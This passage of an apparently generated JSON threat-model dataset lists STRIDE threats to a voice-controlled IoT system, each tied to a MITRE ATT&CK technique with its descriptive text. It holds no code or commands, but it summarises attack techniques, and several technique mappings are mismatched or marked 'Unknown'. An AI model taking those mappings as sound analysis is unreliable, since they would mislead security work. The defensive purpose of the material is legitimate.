                    "Assumption": "The IoT system does not enforce strict non-repudiation controls.",
                    "Role": "System",
                    "Condition": "Lack of measures to enforce accountability and traceability."
                },
                {
                    "Assumption": "Users may have legitimate reasons for denying command issuance.",
                    "Role": "User",
                    "Condition": "Possible external factors influencing user interaction."
                }
            ],
            "Potential Impact": "Disputes over accountability for unauthorized actions, leading to challenges in incident resolution.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "denial of actions",
                "IoT command",
                "traceability",
                "accountability"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts unencrypted voice command sequences transmitted over the network.",
            "Assumptions": [
                {
                    "Assumption": "Voice commands are transmitted without encryption.",
                    "Role": "System",
                    "Condition": "Lack of encryption for sensitive communication."
                },
                {
                    "Assumption": "The attacker has access to the network path.",
                    "Role": "Attacker",
                    "Condition": "Network access or ability to intercept data packets."
                },
                {
                    "Assumption": "Sensitive information is contained within the voice commands.",
                    "Role": "User",
                    "Condition": "Communication of sensitive data through voice commands."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive voice commands.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted voice",
                "network interception",
                "sensitive data",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Data from Network Shared Drive",
                "description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.",
                "id": "attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c",
                "technique_id": "T1039"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in cloud services to access stored voice command data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Existence of unpatched or unknown vulnerabilities."
                },
                {
                    "Assumption": "The attacker can gain appropriate credentials for access.",
                    "Role": "Attacker",
                    "Condition": "Successful acquisition of valid access credentials."
                },
                {
                    "Assumption": "Sensitive voice command data is stored within the cloud service.",
                    "Role": "System",
                    "Condition": "Cloud storage of sensitive command data."
                }
            ],
            "Potential Impact": "Unauthorized access and potential misuse of stored voice command data.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud vulnerability",
                "data access",
                "sensitive information",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker eavesdrops on the communication between the IoT controller and the IoT devices, capturing sensitive control instructions.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not encrypted.",
                    "Role": "System",
                    "Condition": "Lack of encryption for instruction transmissions."
                },
                {
                    "Assumption": "The attacker has access to the communication path.",
                    "Role": "Attacker",
                    "Condition": "Physical or logical access to the communication medium."
                },
                {
                    "Assumption": "Sensitive control instructions are transmitted without additional authentication.",
                    "Role": "System",
                    "Condition": "Absence of authentication measures protecting command integrity."
                }
            ],
            "Potential Impact": "Exposure of sensitive control instructions and potential compromise of device operations.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "IoT communication",
                "control instructions",
                "data interception"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the server-side application with illegitimate voice command requests to exhaust resources and disrupt services.",
            "Assumptions": [
                {
                    "Assumption": "The server can be overwhelmed by high volumes of voice command data.",
                    "Role": "System",
                    "Condition": "Limited resource provisioning for large-scale requests."
                },
                {
                    "Assumption": "The attacker can generate a large volume of requests.",
                    "Role": "Attacker",
                    "Condition": "Availability of botnets or automation tools for request generation."
                },
                {
                    "Assumption": "The system lacks effective rate-limiting and defense mechanisms.",
                    "Role": "System",
                    "Condition": "Insufficient denial-of-service protection measures."
                }
            ],
            "Potential Impact": "Disrupted service availability and degraded user experience.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "resource exhaustion",
                "flood attack",
                "voice command",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disrupts the communication channel between the client-side application and the IoT controller, preventing legitimate IoT commands.",
            "Assumptions": [
                {
                    "Assumption": "The communication channel is susceptible to disruption.",
                    "Role": "System",
                    "Condition": "Unsecured or weakly protected communication channels."
                },
                {
                    "Assumption": "The attacker can interfere with or disrupt communications.",
                    "Role": "Attacker",
                    "Condition": "Capability to jam or intercept communication channels."
                },
                {
                    "Assumption": "Alternative or fallback communication mechanisms are not in place.",
                    "Role": "System",
                    "Condition": "Lack of redundancy or failover mechanisms."
                }
            ],
            "Potential Impact": "Disrupted IoT device functionality and user control capabilities.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "communication disruption",
                "IoT control",
                "channel interference",
                "service interruption"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in the cloud services to overload and crash the system, affecting stored data and application functionalities.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Existence of unpatched vulnerabilities or configuration weaknesses."
                },
                {
                    "Assumption": "The attacker can generate enough load to exploit these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Sufficient resources and knowledge to exploit the vulnerabilities."
                },
                {
                    "Assumption": "Critical services depend on these cloud systems.",
                    "Role": "System",
                    "Condition": "Dependence on cloud services for critical functionality."
                }
            ],
            "Potential Impact": "Service disruption and potential loss of data integrity or availability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud vulnerability",
                "service overload",
                "system crash",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the client-side application to gain administrative control over the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The client-side application has exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Developer oversight or unpatched security flaws."
                },
                {
                    "Assumption": "The attacker can interact with the client-side application.",
                    "Role": "Attacker",
                    "Condition": "Authorized or unauthorized access to the application interface."
                },
                {
                    "Assumption": "The IoT controller does not validate authority before executing commands.",
                    "Role": "System",
                    "Condition": "Weak or missing access control mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized changes to IoT controller configuration and control over connected devices.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "client-side vulnerability",
                "administrative control",
                "IoT controller",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker compromises the cloud services used by the voice-based application to gain higher-level access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have exploitable vulnerabilities.",
                    "Role": "System",
                    "Condition": "Existence of vulnerabilities or weak security configurations."
                },
                {
                    "Assumption": "The attacker can breach the cloud service's security layer.",
                    "Role": "Attacker",
                    "Condition": "Technical capability to exploit the service."
                },
                {
                    "Assumption": "Critical data and functionalities are managed within the cloud service.",
                    "Role": "System",
                    "Condition": "Reliance on cloud services for sensitive operations."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential manipulation of cloud-hosted functionalities.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud service",
                "data breach",
                "sensitive access",
                "service compromise"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--1c2fd73a-e634-44ed-b1b5-9e7cf7404e9f",
                "technique_id": "T1522"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages vulnerabilities in server-side application software to escalate their privileges within the application environment.",
            "Assumptions": [
                {
                    "Assumption": "The server-side application has exploitable flaws.",
                    "Role": "System",
                    "Condition": "Unpatched vulnerabilities or misconfigurations."
                },
                {
                    "Assumption": "The attacker has sufficient access to interact with the application.",
                    "Role": "Attacker",
                    "Condition": "Possession of user-level access or input vectors."
                },
                {
                    "Assumption": "The application environment does not enforce strict privilege separation.",
                    "Role": "System",
                    "Condition": "Lack of robust access control and privilege separation mechanisms."
                }
            ],
            "Potential Impact": "Compromise of application integrity and unauthorized execution of higher-privilege actions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "server-side application",
                "privilege escalation",
                "application environment",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "21",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake device to send commands to the IoT controller.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can communicate directly with the IoT controller.",
                    "Role": "Attacker",
                    "Condition": "The attacker has network access."
                },
                {
                    "Assumption": "The IoT controller does not have strong device authentication.",
                    "Role": "System Designer",
                    "Condition": "Authentication mechanisms are weak or not enforced."
                },
                {
                    "Assumption": "The attacker knows the command format.",
                    "Role": "Attacker",
                    "Condition": "The command format can be deduced or is publicly known."
                }
            ],
            "Potential Impact": "Unauthorized devices controlling IoT devices leading to potential security breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "IoT devices",
                "network",
                "command injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An unauthorized user impersonates another user via social engineering to gain control of the voice command system.",
            "Assumptions": [
                {
                    "Assumption": "Social engineering defenses are inadequate.",
                    "Role": "System Administrator",
                    "Condition": "Staff is not well-trained on social engineering tactics."
                },
                {
                    "Assumption": "Voice command authentication is weak or absent.",
                    "Role": "System Designer",
                    "Condition": "Voice authentication lacks robustness or is not implemented."
                },
                {
                    "Assumption": "The attacker has some knowledge about the target user.",
                    "Role": "Attacker",
                    "Condition": "The attacker can obtain user-specific details."
                }
            ],
            "Potential Impact": "Malicious actors gain control, leading to unauthorized access and potential misuse of the system.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "voice commands",
                "impersonation",
                "access control"
            ],
            "mitre_technique": {
                "name": "Spearphishing Voice",
                "description": "Adversaries may use voice communications to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Impersonation](https://attack.mitre.org/techniques/T1656)) and/or creating a sense of urgency or alarm for the recipient.\n\nAll forms of phishing are electronically delivered social engineering. In this scenario, adversaries use phone calls to elicit sensitive information from victims. Known as voice phishing (or \"vishing\"), these communications can be manually executed by adversaries, hired call centers, or even automated via robocalls. Voice phishers may spoof their phone number while also posing as a trusted entity, such as a business partner or technical support staff.(Citation: BOA Telephone Scams)\n\nVictims may also receive phishing messages that direct them to call a phone number (\"callback phishing\") where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)\n\nAdversaries may also use information from previous reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to tailor pretexts to be even more persuasive and believable for the victim.",
                "id": "attack-pattern--6a5d222a-a7e0-4656-b110-782c33098289",
                "technique_id": "T1598.004"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts and modifies communication between the user and the server-side application to spoof legitimate requests.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can intercept network traffic.",
                    "Role": "Attacker",
                    "Condition": "The network lacks proper encryption."
                },
                {
                    "Assumption": "Encryption and integrity checks are not enforced.",
                    "Role": "System Designer",
                    "Condition": "Messages are sent in plaintext or without integrity checks."
                },
                {
                    "Assumption": "The attacker has the skill to modify intercepted communications.",
                    "Role": "Attacker",
                    "Condition": "The attacker knows how to analyze and modify traffic."
                }
            ],
            "Potential Impact": "Compromised communication integrity and potential unauthorized control of system components.",
            "MITRE ATT&CK Keywords": [
                "man-in-the-middle",
                "spoofing",
                "network communication",
                "message modification"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to the microphone and tampers with its functionality.",
            "Assumptions": [
                {
                    "Assumption": "Physical security controls are inadequate.",
                    "Role": "System Administrator",
                    "Condition": "The device is not in a secured location."
                },
                {
                    "Assumption": "The attacker has the skills to physically tamper with devices.",
                    "Role": "Attacker",
                    "Condition": "The attacker can disassemble and modify hardware."
                },
                {
                    "Assumption": "The microphone has vulnerabilities at the hardware or firmware level.",
                    "Role": "System Designer",
                    "Condition": "Design lacks tamper-proof mechanisms."
                }
            ],
            "Potential Impact": "Corrupted or manipulated voice inputs leading to system malfunction.",
            "MITRE ATT&CK Keywords": [
                "physical access",
                "hardware tampering",
                "microphone",
                "device manipulation"
            ],
            "mitre_technique": {
                "name": "Audio Capture",
                "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.(Citation: ESET Attor Oct 2019)\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
                "id": "attack-pattern--1035cdf2-3e5f-446f-a7a7-e8f6d7925967",
                "technique_id": "T1123"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker injects malicious code into the client-side application to alter the voice command processing.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can deploy malicious code to the client level.",
                    "Role": "Attacker",
                    "Condition": "The system lacks strong application security."
                },
                {
                    "Assumption": "Code integrity checks are not frequently performed or enforced.",
                    "Role": "System Designer",
                    "Condition": "No regular checks or verification of client application integrity."
                },
                {
                    "Assumption": "The attacker knows the architecture of the client application.",
                    "Role": "Attacker",
                    "Condition": "The application's design is not obfuscated."
                }
            ],
            "Potential Impact": "Altered command inputs may lead to unauthorized actions or compromised system integrity.",
            "MITRE ATT&CK Keywords": [
                "code injection",
                "client-side application",
                "malicious code",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Compromise Software Dependencies and Development Tools",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.(Citation: Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. ",
                "id": "attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720",
                "technique_id": "T1195.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with administrative privileges modifies server-side scripts or settings.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has obtained administrative privileges.",
                    "Role": "Attacker",
                    "Condition": "There is insufficient monitoring of privileged accesses."
                },
                {
                    "Assumption": "Server-side configurations are not robustly protected.",
                    "Role": "System Administrator",
                    "Condition": "Configuration files lack appropriate protections."
                },
                {
                    "Assumption": "Security patches and updates are not applied promptly.",
                    "Role": "System Administrator",
                    "Condition": "The system is not up-to-date with security patches."
                }
            ],
            "Potential Impact": "Compromised server operations and potential unauthorized access to sensitive data.",
            "MITRE ATT&CK Keywords": [
                "administrative privileges",
                "server-side scripts",
                "configuration tampering",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Service Registry Permissions Weakness",
                "description": "Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, [PowerShell](https://attack.mitre.org/techniques/T1086), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, then adversaries can change the service binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter Registry keys associated with service failure parameters (such as <code>FailureCommand</code>) that may be executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: TrustedSignal Service Failure)(Citation: Twitter Service Recovery Nov 2017)",
                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies using the voice command system to initiate a critical IoT action.",
            "Assumptions": [
                {
                    "Assumption": "Strong logging and monitoring mechanisms are not in place.",
                    "Role": "System Administrator",
                    "Condition": "The system does not maintain comprehensive logs."
                },
                {
                    "Assumption": "Authentication does not uniquely identify users for critical actions.",
                    "Role": "System Designer",
                    "Condition": "Actions are not tied to specific user identities."
                },
                {
                    "Assumption": "Dispute resolution mechanisms are weak or nonexistent.",
                    "Role": "System Owner",
                    "Condition": "There is no effective way to resolve such disputes."
                }
            ],
            "Potential Impact": "Difficulty in verifying the origin of critical commands, leading to potential security and operational issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "non-repudiation",
                "logging",
                "user authentication"
            ],
            "mitre_technique": {
                "name": "Hooking",
                "description": "Windows processes often leverage application programming interface (API) functions to perform tasks that require reusable system resources. Windows API functions are typically stored in dynamic-link libraries (DLLs) as exported functions. \n\nHooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs. (Citation: Microsoft Hook Overview) (Citation: Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**, which use modifications to a process\u2019s IAT, where pointers to imported API functions are stored. (Citation: Elastic Process Injection July 2017) (Citation: Adlice Software IAT Hooks Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow. (Citation: Elastic Process Injection July 2017) (Citation: HighTech Bridge Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries may use hooking to load and execute malicious code within the context of another process, masking the execution while also allowing access to the process's memory and possibly elevated privileges. Installing hooking mechanisms may also provide Persistence via continuous invocation when the functions are called through normal 